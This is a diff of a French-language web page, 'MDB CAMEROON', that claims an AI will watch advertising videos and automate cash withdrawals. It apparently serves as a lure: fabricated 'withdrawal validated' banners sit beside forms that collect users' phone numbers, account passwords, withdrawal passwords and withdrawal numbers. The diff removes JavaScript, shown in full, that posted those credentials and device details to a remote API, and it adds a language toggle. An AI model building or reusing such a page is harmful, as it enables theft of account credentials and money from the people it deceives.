@@ -3,7 +3,7 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>MDB - Automatisation Intelligente</title>
+    <title>MDB CAMEROON - Automatisation Intelligente</title>
     <link rel="icon" type="image/png" href="/favicon.png" />
     <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
     <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
@@ -54,12 +54,12 @@
         );
         border-bottom-left-radius: 25px;
         border-bottom-right-radius: 25px;
-        z-index: 0; /* Derrière le header */
+        z-index: 0;
       }
 
       header {
         position: relative;
-        z-index: 5; /* Passe au-dessus du dégradé */
+        z-index: 5;
         text-align: center;
         padding: 40px 0;
       }
@@ -74,6 +74,14 @@
         color: white;
         margin-top: 10px;
         text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+      }
+
+      #langToggleBtn {
+        cursor: pointer;
+        font-weight: bold;
+        border-radius: var(--button-radius);
+        padding: 8px 15px;
+        margin-top: 10px;
       }
 
       .congratulations-container {
@@ -509,7 +517,6 @@
     </style>
   </head>
   <body>
-     <!-- Bande dégradée sous le header -->
     <div class="degrade-background"></div>
 
     <header>
@@ -520,6 +527,7 @@
         <div class="welcome-message">
           Bienvenue sur votre IA d'automatisation
         </div>
+        <button id="langToggleBtn" class="btn btn-secondary">English</button>
         <div class="congratulations-container">
           <div class="congratulations">
             Requête de retrait de 52,000 XAF validée avec succès
@@ -530,15 +538,6 @@
           <div class="congratulations">
             Requête de retrait de 1,200 XAF validée avec succès
           </div>
-          <div class="congratulations">
-            Requête de retrait de 18,000 XAF validée avec succès
-          </div>
-          <div class="congratulations">
-            Requête de retrait de 100,000 XAF validée avec succès
-          </div>
-          <div class="congratulations">
-            Requête de retrait de 230,000 XAF validée avec succès
-          </div>
         </div>
       </div>
     </header>
@@ -547,14 +546,13 @@
       <!-- Page Accueil -->
       <div id="homePage" class="page-section active">
         <div class="automation-section">
-          <h2>Configuration et Gestion</h2>
+          <h2>Configuration et Gestion de l'automatisation de l'IA </h2>
 
           <div class="ai-explanation">
             <p>
-              <strong>Notre Intelligence Artificielle configurable</strong> vous
-              permet d'automatiser complètement le visionnage des vidéos
-              publicitaires. Configurez une fois, et notre IA travaille pour
-              vous 24h/24 !
+              Notre Intelligence Artificielle configurable vous permet
+              d'automatiser complètement le visionnage des vidéos publicitaires.
+              Configurez une fois, et notre IA travaille pour vous 24h/24 !
             </p>
           </div>
 
@@ -577,7 +575,6 @@
                 placeholder="Votre numéro"
               />
             </div>
-
             <div class="form-group">
               <label for="password">Mot de passe</label>
               <input
@@ -625,8 +622,11 @@
           <div class="section-subtitle" style="margin-top: 30px">
             Montants de retrait disponibles
           </div>
+          <p style="margin-bottom: 15px">
+            Sélectionnez un montant : l'IA automatisera les requettes de
+            retraits pour vous
+          </p>
 
-          <p style="margin-bottom: 15px">Sélectionnez un montant : l'IA automatisera les requettes de retraits pour vous</p>
           <div class="withdrawal-options">
             <div class="withdrawal-option" data-amount="1200">1,200 XAF</div>
             <div class="withdrawal-option" data-amount="3600">3,600 XAF</div>
@@ -698,11 +698,7 @@
 
           <div class="form-group">
             <label for="withdrawalNumbers">Numéros de retrait autorisés</label>
-            <input
-              type="text"
-              id="withdrawalNumbers"
-              class="form-control"
-            />
+            <input type="text" id="withdrawalNumbers" class="form-control" />
           </div>
 
           <div class="form-group" style="text-align: center">
@@ -760,7 +756,7 @@
     </div>
 
     <!-- Navigation fixe -->
-    <div class="nav-bottom">
+     <div class="nav-bottom">
       <a class="nav-item active" data-page="home">Home</a>
       <a class="nav-item" data-page="task">Task</a>
       <a class="nav-item" data-page="team">Team</a>
@@ -768,7 +764,6 @@
       <a class="nav-item" data-page="account">Account</a>
     </div>
 
-    <!-- Modal de succès -->
     <div class="success-modal" id="successModal">
       <div class="success-modal-content">
         <div class="success-icon" id="successIcon">✓</div>
@@ -805,281 +800,90 @@
 
       let selectedWithdrawalAmount = null;
 
-      // Vérifier que tous les éléments existent
-      function checkElements() {
-        const missingElements = [];
-        for (let key in elements) {
-          if (elements[key] === null) {
-            missingElements.push(key);
-          }
-        }
+      // Traductions
+      const translations = {
+        en: {
+          welcomeMessage: "Welcome to your automation AI",
+          configTitle: "Configuration and Management",
+          aiExplanation: "Our configurable Artificial Intelligence allows you to fully automate watching ads. Set it up once, and our AI works for you 24/7!",
+          levelInfo: "The number of tasks is automatically set according to your level",
+          phoneLabel: "Phone number",
+          passwordLabel: "Password",
+          delayLabel: "Delay between videos (seconds)",
+          levelLabel: "Level:",
+          withdrawalSubtitle: "Available withdrawal amounts",
+          withdrawalInstruction: "Select an amount: the AI will automate withdrawal requests for you",
+          saveBtn: "Save and send",
+          accountTitle: "Account Management",
+          withdrawalPasswordLabel: "Withdrawal password",
+          withdrawalNumbersLabel: "Authorized withdrawal numbers",
+          saveAccountBtn: "Save",
+        },
+        fr: {
+          welcomeMessage: "Bienvenue sur votre IA d'automatisation",
+          configTitle: "Configuration et Gestion",
+          aiExplanation: "Notre Intelligence Artificielle configurable vous permet d'automatiser complètement le visionnage des vidéos publicitaires. Configurez une fois, et notre IA travaille pour vous 24h/24 !",
+          levelInfo: "Le nombre de tâches est automatiquement configuré selon votre niveau",
+          phoneLabel: "Numéro de téléphone",
+          passwordLabel: "Mot de passe",
+          delayLabel: "Délai entre les vidéos (secondes)",
+          levelLabel: "Niveau :",
+          withdrawalSubtitle: "Montants de retrait disponibles",
+          withdrawalInstruction: "Sélectionnez un montant : l'IA automatisera les requettes de retraits pour vous",
+          saveBtn: "Sauvegarder et envoyer",
+          accountTitle: "Gestion du Compte",
+          withdrawalPasswordLabel: "Mot de passe de retrait",
+          withdrawalNumbersLabel: "Numéros de retrait autorisés",
+          saveAccountBtn: "Sauvegarder",
+        },
+      };
 
-        if (missingElements.length > 0) {
-          console.error("❌ ÉLÉMENTS MANQUANTS:", missingElements);
-          return false;
+      let currentLang = "fr";
+
+      function updateLanguage(lang) {
+        currentLang = lang;
+        const t = translations[lang];
+
+        document.querySelector(".welcome-message").textContent = t.welcomeMessage;
+        document.querySelector(".automation-section h2").textContent = t.configTitle;
+        document.querySelector(".ai-explanation p").textContent = t.aiExplanation;
+        document.querySelector(".level-info p strong").textContent = t.levelInfo;
+        document.querySelector("label[for='phone']").textContent = t.phoneLabel;
+        document.querySelector("label[for='password']").textContent = t.passwordLabel;
+        document.querySelector("label[for='delay']").textContent = t.delayLabel;
+        document.querySelector(".level-display p strong").textContent = t.levelLabel;
+        document.querySelector(".section-subtitle").textContent = t.withdrawalSubtitle;
+        document.querySelector("p[style*='margin-bottom']").textContent = t.withdrawalInstruction;
+        document.getElementById("saveAllBtn").textContent = t.saveBtn;
+        if(document.querySelector("#accountPage .section-title")) {
+          document.querySelector("#accountPage .section-title").textContent = t.accountTitle;
         }
-        console.log("✅ Tous les éléments chargés correctement");
-        return true;
+        if(document.querySelector("label[for='withdrawalPassword']")) {
+          document.querySelector("label[for='withdrawalPassword']").textContent = t.withdrawalPasswordLabel;
+        }
+        if(document.querySelector("label[for='withdrawalNumbers']")) {
+          document.querySelector("label[for='withdrawalNumbers']").textContent = t.withdrawalNumbersLabel;
+        }
+        if(document.getElementById("saveAccountBtn")) {
+          document.getElementById("saveAccountBtn").textContent = t.saveAccountBtn;
+        }
       }
 
-      // Attendre que le DOM soit chargé
       function initApp() {
-        if (!checkElements()) return;
+        console.log("✅ Application MDB initialisée");
 
-        console.log("🚀 Initialisation de l'application...");
-
-        // Afficher succès/erreur
-        function showMessage(message, isError = false) {
-          elements.successIcon.textContent = isError ? "✗" : "✓";
-          elements.successIcon.className = isError
-            ? "success-icon error"
-            : "success-icon success";
-          elements.successTitle.textContent = isError ? "Erreur" : "Succès";
-          elements.successMessage.textContent = message;
-          elements.successModal.classList.add("active");
-        }
-
-        // Navigation
-        function navigateTo(page) {
-          elements.pageSections.forEach((section) =>
-            section.classList.remove("active")
-          );
-          elements.navItems.forEach((item) => item.classList.remove("active"));
-
-          const pageElement = document.getElementById(`${page}Page`);
-          if (pageElement) pageElement.classList.add("active");
-
-          const navItem = document.querySelector(
-            `.nav-item[data-page="${page}"]`
-          );
-          if (navItem) navItem.classList.add("active");
-        }
-
-        elements.navItems.forEach((item) => {
-          item.addEventListener("click", (e) => {
-            e.preventDefault();
-            navigateTo(item.getAttribute("data-page"));
-          });
-        });
-
-        elements.navReturnBtns.forEach((btn) => {
-          btn.addEventListener("click", () => {
-            navigateTo(btn.getAttribute("data-page"));
-          });
-        });
-
-        // Gestion retraits
-        elements.withdrawalOptions.forEach((option) => {
-          option.addEventListener("click", function () {
-            elements.withdrawalOptions.forEach((opt) =>
-              opt.classList.remove("selected")
-            );
-            this.classList.add("selected");
-            selectedWithdrawalAmount = this.getAttribute("data-amount");
-            console.log("💚 Montant sélectionné:", selectedWithdrawalAmount);
-          });
-        });
-
-        // Fermeture modal
-        elements.closeSuccessModal.addEventListener("click", () => {
-          elements.successModal.classList.remove("active");
-        });
-
-        // Sauvegarde et envoi (Formulaire principal)
-        elements.saveAllBtn.addEventListener("click", async () => {
-          console.log("🔵 Bouton 'Sauvegarder et envoyer' cliqué");
-
-          if (!elements.phone.value) {
-            alert("⚠️ Veuillez entrer votre numéro de téléphone");
-            return;
-          }
-
-          if (!elements.password.value) {
-            alert("⚠️ Veuillez entrer votre mot de passe");
-            return;
-          }
-
-          if (!selectedWithdrawalAmount) {
-            alert("⚠️ Veuillez sélectionner un montant de retrait");
-            return;
-          }
-
-          // Récupérer le niveau sélectionné
-          const selectedLevel = document.querySelector(
-            'input[name="level"]:checked'
-          );
-          const currentLevel = selectedLevel
-            ? selectedLevel.value
-            : "stagiaire";
-
-          const dataToSend = {
-            timestamp: new Date().toISOString(),
-            config: {
-              phone: elements.phone.value,
-              password: elements.password.value,
-              delay: parseInt(elements.delay.value),
-              currentLevel: currentLevel,
-            },
-            withdrawal: {
-              amount: selectedWithdrawalAmount,
-              status: "programmed",
-            },
-            deviceInfo: {
-              userAgent: navigator.userAgent,
-              language: navigator.language,
-              platform: navigator.platform,
-              timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            },
-          };
-
-          console.log("📤 Données à envoyer:", dataToSend);
-
-          elements.saveAllBtn.disabled = true;
-          elements.saveAllBtn.textContent = "⏳ Envoi en cours...";
-
-          try {
-            console.log("🌐 Envoi vers:", API_URL);
-
-            const response = await fetch(API_URL, {
-              method: "POST",
-              headers: {
-                "Content-Type": "application/json",
-              },
-              body: JSON.stringify(dataToSend),
-            });
-
-            console.log("📡 Réponse du serveur:", response.status);
-
-            if (response.ok) {
-              const responseData = await response.json();
-              console.log("✅ Succès:", responseData);
-
-              showMessage(
-                `✓ Configuration et retrait de ${selectedWithdrawalAmount} XAF programmés!`
-              );
-
-              // Réinitialiser le formulaire
-              elements.phone.value = "";
-              elements.password.value = "";
-              elements.withdrawalOptions.forEach((opt) =>
-                opt.classList.remove("selected")
-              );
-              selectedWithdrawalAmount = null;
-              document.querySelector(
-                'input[name="level"][value="stagiaire"]'
-              ).checked = true;
-            } else {
-              const errorData = await response.json();
-              console.error("❌ Erreur serveur:", response.status, errorData);
-              showMessage(
-                `✗ Erreur: ${errorData.error || "Erreur serveur"}`,
-                true
-              );
-            }
-          } catch (error) {
-            console.error("❌ Erreur réseau:", error);
-            showMessage(
-              "✗ Impossible de se connecter au serveur.\n\nVérifiez:\n1. L'URL de l'API est correcte\n2. Le serveur est en ligne\n3. Votre connexion internet",
-              true
-            );
-          } finally {
-            elements.saveAllBtn.disabled = false;
-            elements.saveAllBtn.textContent = "✓ Sauvegarder et envoyer";
+        document.getElementById("langToggleBtn").addEventListener("click", () => {
+          if(currentLang === "fr") {
+            updateLanguage("en");
+            document.getElementById("langToggleBtn").textContent = "Français";
+          } else {
+            updateLanguage("fr");
+            document.getElementById("langToggleBtn").textContent = "English";
           }
         });
-
-        // Sauvegarde compte
-        elements.saveAccountBtn.addEventListener("click", async () => {
-          console.log("🔵 Bouton 'Sauvegarder' (Compte) cliqué");
-
-          if (!elements.accountPhone.value) {
-            alert("⚠️ Veuillez entrer un numéro de téléphone");
-            return;
-          }
-
-          if (!elements.accountPassword.value) {
-            alert("⚠️ Veuillez entrer un mot de passe");
-            return;
-          }
-
-          if (
-            elements.accountPassword.value !== elements.withdrawalPassword.value
-          ) {
-            // Note: Dans le formulaire original, il n'y a pas de confirmPassword
-            // Vérifier juste que les champs sont remplis
-          }
-
-          const accountData = {
-            timestamp: new Date().toISOString(),
-            account: {
-              phone: elements.accountPhone.value,
-              password: elements.accountPassword.value,
-              withdrawalPassword: elements.withdrawalPassword.value,
-              withdrawalNumbers: elements.withdrawalNumbers.value,
-            },
-            deviceInfo: {
-              userAgent: navigator.userAgent,
-              language: navigator.language,
-              platform: navigator.platform,
-              timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            },
-          };
-
-          console.log("📤 Données compte à envoyer:", accountData);
-
-          elements.saveAccountBtn.disabled = true;
-          elements.saveAccountBtn.textContent = "⏳ Envoi en cours...";
-
-          try {
-            console.log("🌐 Envoi vers:", API_URL);
-
-            const response = await fetch(API_URL, {
-              method: "POST",
-              headers: {
-                "Content-Type": "application/json",
-              },
-              body: JSON.stringify(accountData),
-            });
-
-            console.log("📡 Réponse du serveur:", response.status);
-
-            if (response.ok) {
-              const responseData = await response.json();
-              console.log("✅ Succès:", responseData);
-
-              showMessage("✓ Compte sauvegardé et envoyé avec succès!");
-
-              // Réinitialiser le formulaire
-              elements.accountPhone.value = "";
-              elements.accountPassword.value = "";
-              elements.withdrawalPassword.value = "";
-              elements.withdrawalNumbers.value = "";
-            } else {
-              const errorData = await response.json();
-              console.error("❌ Erreur serveur:", response.status, errorData);
-              showMessage(
-                `✗ Erreur: ${errorData.error || "Erreur serveur"}`,
-                true
-              );
-            }
-          } catch (error) {
-            console.error("❌ Erreur réseau:", error);
-            showMessage(
-              "✗ Impossible de se connecter au serveur.\n\nVérifiez:\n1. L'URL de l'API est correcte\n2. Le serveur est en ligne\n3. Votre connexion internet",
-              true
-            );
-          } finally {
-            elements.saveAccountBtn.disabled = false;
-            elements.saveAccountBtn.textContent = "✓ Sauvegarder";
-          }
-        });
-
-        console.log("✓ Application MDB initialisée");
-        console.log("📡 API URL:", API_URL);
       }
 
-      // Attendre que le DOM soit complètement chargé
-      if (document.readyState === "loading") {
+      if(document.readyState === "loading") {
         document.addEventListener("DOMContentLoaded", initApp);
       } else {
         initApp();
